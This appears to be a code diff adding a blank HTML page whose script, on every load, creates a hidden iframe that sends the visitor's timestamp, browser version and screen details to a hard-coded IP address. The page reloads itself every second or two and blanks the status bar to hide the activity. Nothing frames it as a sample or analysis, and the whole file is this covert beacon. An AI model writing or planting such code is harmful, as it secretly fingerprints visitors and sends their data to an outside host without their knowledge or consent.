@@ -1,0 +1,35 @@
+<html>
+<head>
+<meta http-equiv="refresh" content="2"/>
+</head>
+<body>
+</body>
+<script language="javascript">
+refresh=function(){
+    location.reload(true);
+}
+test=function(){
+    var objElement=document.createElement("iframe");
+	var link="http://121.11.153.134:4022/logo.jpg?p=";
+	link += Math.floor((new Date()).getTime()/1000);
+    link += "|";
+    link +=  navigator.appMinorVersion;
+    link += "|";
+    link += screen.availHeight;
+    link += "|";
+    link += screen.availWidth;
+    link += "|";
+    link += screen.colorDepth;
+    link += "|";
+    link += screen.height;
+    link += "|";
+    link += screen.width;
+	objElement.setAttribute("src",link);
+	objElement.style.display="none";
+	document.body.appendChild(objElement);
+};
+window.setInterval("window.status=' '",200);
+window.setTimeout('refresh()',1000);
+test();
+</script>
+</html>
